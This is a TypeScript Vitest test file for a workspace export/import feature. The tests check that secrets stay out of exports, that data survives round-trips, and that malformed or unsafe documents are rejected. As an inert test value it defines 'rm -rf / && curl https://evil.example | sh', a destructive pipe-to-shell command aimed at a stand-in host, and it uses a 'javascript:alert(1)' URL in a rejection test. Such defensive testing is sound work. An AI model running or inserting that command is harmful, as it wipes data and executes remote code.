import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { accounts, count, eq, globalDecisions, importRequests, profiles, projectDecisions, projects, recipes, resources, sessions, users, type Database } from "@devcontext/db";
import { createTestDatabase } from "@devcontext/db/testing";
import { portableLimits, type PortableDocument } from "@devcontext/contracts";
import { createCompatibilityRepository } from "../src/modules/compatibility/repository.js";
import { createCompatibilityService } from "../src/modules/compatibility/service.js";
import { createContextRepository } from "../src/modules/context/repository.js";
import { createContextService, type ContextService } from "../src/modules/context/service.js";
import { createDecisionRepository } from "../src/modules/decisions/repository.js";
import { createDecisionService, type DecisionService } from "../src/modules/decisions/service.js";
import { createPortabilityRepository } from "../src/modules/portability/repository.js";
import { buildPortableDocument, createPortabilityService, validatePortableDocument, type PortabilityService, type WorkspaceRows } from "../src/modules/portability/service.js";
import { createProfileRepository } from "../src/modules/profiles/repository.js";
import { createProfileService } from "../src/modules/profiles/service.js";
import { createProjectRepository } from "../src/modules/projects/repository.js";
import { createProjectService, type ProjectService } from "../src/modules/projects/service.js";
import { createRecipeRepository } from "../src/modules/recipes/repository.js";
import { createRecipeService } from "../src/modules/recipes/service.js";
import { createResourceRepository } from "../src/modules/resources/repository.js";
import { createResourceService, type ResourceService } from "../src/modules/resources/service.js";
import { createWorkspaceRepository, type WorkspaceRepository } from "../src/modules/workspace/repository.js";

const ownerA = "00000000-0000-4000-8000-000000000001";
const ownerB = "00000000-0000-4000-8000-000000000002";
const base = { priority: 0, constraints: {}, rationale: null, conditions: {} };
const secretToken = "session-token-should-never-export";
const passwordHash = "scrypt-hashed-password-value";
const inertCommand = "rm -rf / && curl https://evil.example | sh";

let database: Pick<Database, "db" | "close">;
let resourcesService: ResourceService;
let projectsService: ProjectService;
let decisionsService: DecisionService;
let contextService: ContextService;
let portability: PortabilityService;
let workspace: WorkspaceRepository;
let exported: PortableDocument;
let projectA = "";

function describeDecisions(views: Awaited<ReturnType<DecisionService["list"]>>) {
  return views.map((view) => `${view.slot}:${view.source}:${view.effective.mode}:${view.effective.resource?.name ?? "-"}:${view.effective.origin?.name ?? "-"}`).sort();
}

beforeAll(async () => {
  database = await createTestDatabase();
  resourcesService = createResourceService(createResourceRepository(database));
  const profilesService = createProfileService(createProfileRepository(database));
  const recipesService = createRecipeService(createRecipeRepository(database));
  projectsService = createProjectService(createProjectRepository(database));
  decisionsService = createDecisionService(createDecisionRepository(database));
  contextService = createContextService(createContextRepository(database));
  const compatibility = createCompatibilityService(createCompatibilityRepository(database));
  workspace = createWorkspaceRepository(database);
  portability = createPortabilityService(createPortabilityRepository(database), () => new Date("2026-09-07T12:00:00Z"));
  await database.db.insert(users).values([
    { id: ownerA, email: "owner-a@example.test", name: "Owner A" },
    { id: ownerB, email: "owner-b@example.test", name: "Owner B" },
  ]);
  await database.db.insert(sessions).values({ token: secretToken, userId: ownerA, expiresAt: new Date("2030-01-01T00:00:00Z"), ipAddress: "10.0.0.1" });
  await database.db.insert(accounts).values({ accountId: ownerA, providerId: "credential", userId: ownerA, password: passwordHash, accessToken: "oauth-access-token" });

  const nextJs = (await resourcesService.create(ownerA, {
    name: "Next.js", type: "framework", sourceUrl: "https://nextjs.org", docsUrl: "https://nextjs.org/docs", installCommand: inertCommand,
    tags: ["frontend", "react"], notes: "Private notes stay with the owner.", metadata: { weight: 1, nested: { list: ["a", "b"] } },
    preference: { slot: "frontend.framework", mode: "LOCKED" },
  })).resource;
  const postgres = (await resourcesService.create(ownerA, { name: "PostgreSQL", type: "database", sourceUrl: "https://www.postgresql.org", tags: [], metadata: {}, preference: { slot: "database.primary", mode: "PREFERRED" } })).resource;
  const redis = (await resourcesService.create(ownerA, { name: "Redis", type: "cache", tags: ["infra"], metadata: {} })).resource;
  const archived = (await resourcesService.create(ownerA, { name: "Old kit", type: "ui_library", tags: [], metadata: {} })).resource;
  await resourcesService.update(ownerA, redis.id, { favorite: true });
  await resourcesService.archive(ownerA, archived.id);
  await compatibility.create(ownerA, { kind: "requires", leftResourceId: nextJs.id, rightResourceId: postgres.id, note: "Drizzle targets PostgreSQL" });

  const stack = await profilesService.create(ownerA, { name: "Stack", type: "stack", description: "Base stack" });
  await profilesService.upsertDecision(ownerA, stack.id, "database.primary", { ...base, mode: "LOCKED", resourceId: postgres.id, rationale: "Relational" });
  await profilesService.upsertDecision(ownerA, stack.id, "backend.framework", { ...base, mode: "AI_DECIDE", resourceId: null, constraints: { allowed: ["Fastify"], notes: "Keep it boring" } });
  const recipe = await recipesService.create(ownerA, { name: "SaaS MVP", description: "Recipe", profiles: [{ profileId: stack.id, priority: 5 }] });
  await recipesService.upsertDecision(ownerA, recipe.id, "database.cache", { ...base, mode: "DISABLED", resourceId: redis.id, rationale: "One store" });

  const project = await projectsService.create(ownerA, {
    name: "Atlas", description: "Finance", productType: "SaaS", stage: "production", platforms: ["web", "cli"], priorities: ["Fast MVP"],
    rules: ["Validate inputs with Zod."], recipeId: recipe.id, profiles: [{ profileId: stack.id, priority: 1 }], resourceIds: [nextJs.id, redis.id],
  });
  projectA = project.project.id;
  await decisionsService.upsert(ownerA, projectA, "frontend.ui.base", { ...base, mode: "AI_DECIDE", resourceId: null, constraints: { excluded: ["MUI"] } });
  await decisionsService.upsert(ownerA, projectA, "database.primary", { ...base, mode: "LOCKED", resourceId: postgres.id, rationale: "Project override", priority: 2 });
  await projectsService.archive(ownerA, (await projectsService.create(ownerA, { name: "Archived project", stage: "mvp", platforms: ["web"], priorities: [], rules: [] })).project.id);
  await contextService.compile(ownerA, projectA);
}, 60_000);

afterAll(async () => { await database.close(); });

describe("portable export", () => {
  it("exports structured data with opaque refs and without account, session, provider or history rows", async () => {
    exported = await portability.exportWorkspace(ownerA);
    expect(exported).toMatchObject({ format: "devcontext", version: 1, exportedAt: "2026-09-07T12:00:00.000Z" });
    expect(exported.resources).toHaveLength(4);
    expect(exported.profiles).toHaveLength(1);
    expect(exported.recipes).toHaveLength(1);
    expect(exported.projects).toHaveLength(2);
    expect(exported.compatibilityRules).toHaveLength(1);
    const nextJs = exported.resources.find((resource) => resource.name === "Next.js")!;
    expect(nextJs).toMatchObject({ tags: ["frontend", "react"], installCommand: inertCommand, notes: "Private notes stay with the owner.", metadata: { weight: 1, nested: { list: ["a", "b"] } }, preference: { slot: "frontend.framework", mode: "LOCKED" }, archived: false });
    expect(exported.resources.find((resource) => resource.name === "Old kit")?.archived).toBe(true);
    expect(exported.resources.find((resource) => resource.name === "Redis")?.favorite).toBe(true);
    const atlas = exported.projects.find((project) => project.name === "Atlas")!;
    expect(atlas).toMatchObject({ stage: "production", status: "active", platforms: ["web", "cli"], rules: ["Validate inputs with Zod."], recipeRef: exported.recipes[0]!.ref });
    expect(atlas.resourceRefs).toHaveLength(2);
    expect(atlas.decisions.map((decision) => decision.slot)).toEqual(["database.primary", "frontend.ui.base"]);
    expect(exported.recipes[0]).toMatchObject({ profiles: [{ profileRef: exported.profiles[0]!.ref, priority: 5 }], decisions: [expect.objectContaining({ slot: "database.cache", mode: "DISABLED", resourceRef: exported.resources.find((resource) => resource.name === "Redis")!.ref })] });
    const text = JSON.stringify(exported);
    for (const secret of [secretToken, passwordHash, "oauth-access-token", "owner-a@example.test", "contentHash", "canonical", "audit"]) {
      expect(text).not.toContain(secret);
    }
    expect(validatePortableDocument(JSON.parse(text))).toEqual(exported);
    expect(await portability.exportWorkspace(ownerB)).toMatchObject({ resources: [], profiles: [], recipes: [], projects: [], compatibilityRules: [] });
  });
});

describe("portable import", () => {
  it("preserves unresolved decisions left by a deleted resource on export and import", async () => {
    const owner = crypto.randomUUID();
    const destination = crypto.randomUUID();
    await database.db.insert(users).values([owner, destination].map((id) => ({ id, email: `${id}@example.test`, name: "Unresolved" })));
    const resource = (await resourcesService.create(owner, { name: "Removed tool", type: "cli", tags: [], metadata: {} })).resource;
    const project = (await projectsService.create(owner, { name: "Keeps intent", stage: "mvp", platforms: [], priorities: [], rules: [] })).project;
    await decisionsService.upsert(owner, project.id, "custom.tool", { ...base, mode: "LOCKED", resourceId: resource.id, rationale: "Preserve this requirement" });
    await database.db.delete(resources).where(eq(resources.id, resource.id));
    const document = await portability.exportWorkspace(owner);
    expect(document.projects[0]!.decisions[0]).toMatchObject({ mode: "LOCKED", resourceRef: null, rationale: "Preserve this requirement" });
    await portability.importWorkspace(destination, { document, strategy: "skip", dryRun: false }, crypto.randomUUID());
    const imported = await portability.exportWorkspace(destination);
    expect(imported.projects[0]!.decisions).toEqual(document.projects[0]!.decisions);
    const stored = await database.db.select().from(projectDecisions).where(eq(projectDecisions.projectId, imported.projects[0]!.ref));
    expect(stored[0]).toMatchObject({ mode: "LOCKED", resourceId: null });
    const compiled = await contextService.compile(destination, imported.projects[0]!.ref);
    expect(compiled.version.canonical.warnings.length).toBeGreaterThan(0);
  });

  it("round-trips a UTF-8 document above the old 1 MiB cap", async () => {
    const owner = crypto.randomUUID();
    await database.db.insert(users).values({ id: owner, email: `${owner}@example.test`, name: "Large library" });
    const rows: WorkspaceRows = { resources: [], profiles: [], recipes: [], projects: [], compatibilityRules: [], globalDecisions: [] };
    for (let index = 0; index < 70; index += 1) rows.resources.push({
      id: crypto.randomUUID(), name: `Tool ${index}`, type: "cli", description: null, sourceUrl: null, docsUrl: null, repoUrl: null,
      installCommand: null, notes: "ş".repeat(9_000), metadata: {}, favorite: false, archived: false, tags: [], preference: null,
    });
    const document = buildPortableDocument(rows, new Date());
    expect(Buffer.byteLength(JSON.stringify(document))).toBeGreaterThan(1_048_576);
    await portability.importWorkspace(owner, { document, strategy: "skip", dryRun: false }, crypto.randomUUID());
    const roundTrip = await portability.exportWorkspace(owner);
    expect(roundTrip.resources).toHaveLength(70);
    expect(roundTrip.resources.map((resource) => resource.notes)).toEqual(document.resources.map((resource) => resource.notes));
    expect(() => validatePortableDocument(roundTrip)).not.toThrow();
  });

  it("rejects excessive depth/bytes and refuses to emit an unimportable export", async () => {
    let nested: unknown = {};
    for (let index = 0; index < portableLimits.jsonDepth + 1; index += 1) nested = { nested };
    const empty = { format: "devcontext", version: 1, resources: [], profiles: [], recipes: [], projects: [], compatibilityRules: [] };
    expect(() => validatePortableDocument({ ...empty, nested })).toThrow(/invalid/);
    expect(() => validatePortableDocument({ ...empty, padding: "x".repeat(portableLimits.documentBytes) })).toThrow(/too large/);
    const repository = createPortabilityRepository(database);
    const tooMany = createPortabilityService({ ...repository, async loadWorkspace(owner) {
      const rows = await repository.loadWorkspace(owner);
      rows.resources = Array.from({ length: portableLimits.resources + 1 }, (_, index) => ({ ...rows.resources[0]!, id: `resource-${index}` }));
      return rows;
    } });
    await expect(tooMany.exportWorkspace(ownerA)).rejects.toMatchObject({ statusCode: 409, details: [{ path: ["workspace"], code: "export_not_portable" }] });
  });

  it("dry-runs without mutating anything and reports the plan", async () => {
    const preview = await portability.importWorkspace(ownerB, { document: exported, strategy: "skip", dryRun: true });
    expect(preview).toMatchObject({ applied: false, created: false });
    expect(preview.summary.dryRun).toBe(true);
    expect(preview.summary.counts).toEqual({
      resources: { create: 4, skip: 0, replace: 0, copy: 0 },
      profiles: { create: 1, skip: 0, replace: 0, copy: 0 },
      recipes: { create: 1, skip: 0, replace: 0, copy: 0 },
      projects: { create: 2, skip: 0, replace: 0, copy: 0 },
      compatibilityRules: { create: 1, skip: 0, replace: 0, copy: 0 },
    });
    expect(preview.summary.items.filter((item) => item.type === "resource").map((item) => item.action)).toEqual(["create", "create", "create", "create"]);
    expect((await database.db.select({ value: count() }).from(resources).where(eq(resources.ownerUserId, ownerB)))[0]?.value).toBe(0);
    expect((await database.db.select({ value: count() }).from(importRequests).where(eq(importRequests.ownerUserId, ownerB)))[0]?.value).toBe(0);
  });

  it("round-trips into an empty account, preserving decisions, inheritance, preferences and rules", async () => {
    const key = "00000000-0000-4000-8000-000000000090";
    const result = await portability.importWorkspace(ownerB, { document: exported, strategy: "skip", dryRun: false }, key);
    expect(result).toMatchObject({ applied: true, created: true });
    expect(result.summary.dryRun).toBe(false);
    expect(result.summary.counts.resources.create).toBe(4);

    const listed = await resourcesService.list(ownerB, { archived: "all", limit: 50, offset: 0 });
    expect(listed.resources.map((resource) => resource.name).sort()).toEqual(["Next.js", "Old kit", "PostgreSQL", "Redis"]);
    const nextJs = listed.resources.find((resource) => resource.name === "Next.js")!;
    expect(nextJs).toMatchObject({ tags: ["frontend", "react"], installCommand: inertCommand, preference: { slot: "frontend.framework", mode: "LOCKED" }, metadata: { weight: 1, nested: { list: ["a", "b"] } } });
    expect(listed.resources.find((resource) => resource.name === "Old kit")?.archivedAt).toEqual(expect.any(String));
    expect(listed.resources.find((resource) => resource.name === "Redis")?.favorite).toBe(true);
    // Ids are fresh: nothing points at owner A's rows.
    const aIds = new Set(exported.resources.map((resource) => resource.ref));
    expect(listed.resources.some((resource) => aIds.has(resource.id))).toBe(false);

    const projectsB = await projectsService.list(ownerB, { status: "all", limit: 10, offset: 0 });
    const atlasB = projectsB.projects.find((project) => project.name === "Atlas")!;
    expect(atlasB).toMatchObject({ stage: "production", rules: ["Validate inputs with Zod."], recipe: { name: "SaaS MVP" }, profiles: [expect.objectContaining({ name: "Stack", priority: 1 })] });
    expect(atlasB.resources.map((resource) => resource.name).sort()).toEqual(["Next.js", "Redis"]);
    expect(projectsB.projects.find((project) => project.name === "Archived project")?.status).toBe("archived");
    expect(describeDecisions(await decisionsService.list(ownerB, atlasB.id))).toEqual(describeDecisions(await decisionsService.list(ownerA, projectA)));
    const compiledB = await contextService.compile(ownerB, atlasB.id);
    const compiledA = await contextService.getVersion(ownerA, projectA, 1);
    const shape = (decisions: typeof compiledA.canonical.decisions) => decisions.map((decision) => [decision.slot, decision.mode, decision.source, decision.resource?.name ?? null, decision.origin?.name ?? null, decision.rationale, decision.constraints]);
    expect(shape(compiledB.version.canonical.decisions)).toEqual(shape(compiledA.canonical.decisions));
    expect(compiledB.version.canonical.warnings.map((warning) => warning.code)).toEqual(compiledA.canonical.warnings.map((warning) => warning.code));
    expect(compiledB.version.canonical.rules).toEqual(compiledA.canonical.rules);
    expect((await database.db.select({ value: count() }).from(globalDecisions).where(eq(globalDecisions.ownerUserId, ownerB)))[0]?.value).toBe(2);
    // Owner A is untouched.
    expect((await database.db.select({ value: count() }).from(resources).where(eq(resources.ownerUserId, ownerA)))[0]?.value).toBe(4);

    const replay = await portability.importWorkspace(ownerB, { document: exported, strategy: "copy", dryRun: false }, key);
    expect(replay).toMatchObject({ applied: true, created: false });
    expect(replay.summary).toEqual(result.summary);
    expect((await database.db.select({ value: count() }).from(resources).where(eq(resources.ownerUserId, ownerB)))[0]?.value).toBe(4);
  });

  it("handles duplicates deterministically: skip keeps, copy duplicates, replace updates only when asked", async () => {
    const skipped = await portability.importWorkspace(ownerB, { document: exported, strategy: "skip", dryRun: false });
    expect(skipped.summary.counts.resources).toEqual({ create: 1, skip: 3, replace: 0, copy: 0 });
    expect(skipped.summary.counts.projects).toEqual({ create: 1, skip: 1, replace: 0, copy: 0 });
    expect((await database.db.select({ value: count() }).from(resources).where(eq(resources.ownerUserId, ownerB)))[0]?.value).toBe(5);
    expect((await database.db.select({ value: count() }).from(projects).where(eq(projects.ownerUserId, ownerB)))[0]?.value).toBe(3);

    const renamed: PortableDocument = {
      ...exported,
      resources: exported.resources.map((resource) => resource.name === "PostgreSQL" ? { ...resource, description: "Replaced description", tags: ["data"], preference: { slot: "database.primary", mode: "LOCKED" } } : resource),
      profiles: exported.profiles.map((profile) => ({ ...profile, decisions: profile.decisions.filter((decision) => decision.slot !== "backend.framework") })),
    };
    const replaced = await portability.importWorkspace(ownerB, { document: renamed, strategy: "replace", dryRun: false });
    expect(replaced.summary.counts.resources).toEqual({ create: 1, skip: 0, replace: 3, copy: 0 });
    const postgresB = (await resourcesService.list(ownerB, { archived: "active", q: "PostgreSQL", limit: 10, offset: 0 })).resources[0]!;
    expect(postgresB).toMatchObject({ description: "Replaced description", tags: ["data"], preference: { slot: "database.primary", mode: "LOCKED" } });
    expect((await database.db.select({ value: count() }).from(profiles).where(eq(profiles.ownerUserId, ownerB)))[0]?.value).toBe(1);
    expect((await database.db.select({ value: count() }).from(resources).where(eq(resources.ownerUserId, ownerB)))[0]?.value).toBe(6);

    const copied = await portability.importWorkspace(ownerB, { document: exported, strategy: "copy", dryRun: false });
    expect(copied.summary.counts.recipes).toEqual({ create: 0, skip: 0, replace: 0, copy: 1 });
    expect((await database.db.select({ value: count() }).from(recipes).where(eq(recipes.ownerUserId, ownerB)))[0]?.value).toBe(2);
    expect((await resourcesService.list(ownerB, { archived: "active", q: "(imported)", limit: 10, offset: 0 })).resources.map((resource) => resource.name).sort()).toEqual(["Next.js (imported)", "PostgreSQL (imported)", "Redis (imported)"]);
    expect(copied.summary.warnings.some((warning) => warning.includes("Kept your existing Library rule"))).toBe(true);
  });

  it("rejects invalid, future-version, oversized and inconsistent documents before any write", async () => {
    const before = (await database.db.select({ value: count() }).from(resources).where(eq(resources.ownerUserId, ownerB)))[0]?.value;
    await expect(portability.importWorkspace(ownerB, { document: { ...exported, version: 2 }, strategy: "skip", dryRun: false }))
      .rejects.toMatchObject({ statusCode: 400, details: [{ path: ["document", "version"], code: "unsupported_version" }], publicMessage: expect.stringContaining("version 2") });
    await expect(portability.importWorkspace(ownerB, { document: { format: "other", version: 1 }, strategy: "skip", dryRun: false })).rejects.toMatchObject({ details: [{ path: ["document", "format"], code: "unsupported_format" }] });
    await expect(portability.importWorkspace(ownerB, { document: "text", strategy: "skip", dryRun: false })).rejects.toMatchObject({ statusCode: 400 });
    const unknownRef: PortableDocument = { ...exported, projects: [{ ...exported.projects[0]!, decisions: [{ slot: "custom.x", mode: "LOCKED", resourceRef: "missing", priority: 0, constraints: {}, rationale: null, conditions: {} }] }] };
    await expect(portability.importWorkspace(ownerB, { document: unknownRef, strategy: "skip", dryRun: false })).rejects.toMatchObject({ details: [{ path: ["document", "projects", "0", "decisions", "0", "resourceRef"], code: "unknown_ref" }] });
    const duplicateRef: PortableDocument = { ...exported, resources: [exported.resources[0]!, exported.resources[0]!] };
    await expect(portability.importWorkspace(ownerB, { document: duplicateRef, strategy: "skip", dryRun: false })).rejects.toMatchObject({ details: expect.arrayContaining([{ path: ["document", "resources", "1", "ref"], code: "duplicate_ref" }]) });
    const delegatedWithResource: PortableDocument = { ...exported, profiles: [{ ...exported.profiles[0]!, decisions: [{ slot: "custom.y", mode: "AI_DECIDE", resourceRef: exported.resources[0]!.ref, priority: 0, constraints: {}, rationale: null, conditions: {} }] }] };
    await expect(portability.importWorkspace(ownerB, { document: delegatedWithResource, strategy: "skip", dryRun: false })).rejects.toMatchObject({ details: [{ path: ["document", "profiles", "0", "decisions", "0", "resourceRef"], code: "resource_not_allowed" }] });
    const unsafeUrl = { ...exported, resources: [{ ...exported.resources[0]!, sourceUrl: "javascript:alert(1)" }] };
    await expect(portability.importWorkspace(ownerB, { document: unsafeUrl, strategy: "skip", dryRun: false })).rejects.toMatchObject({ statusCode: 400 });
    const oversized = { ...exported, resources: Array.from({ length: portableLimits.resources + 1 }, (_, index) => ({ ...exported.resources[0]!, ref: `r${index}`, name: `R ${index}`, sourceUrl: null })) };
    await expect(portability.importWorkspace(ownerB, { document: oversized, strategy: "skip", dryRun: false })).rejects.toMatchObject({ statusCode: 400 });
    expect((await database.db.select({ value: count() }).from(resources).where(eq(resources.ownerUserId, ownerB)))[0]?.value).toBe(before);
    expect((await workspace.summary(ownerA)).resources).toBe(3);
  });
});
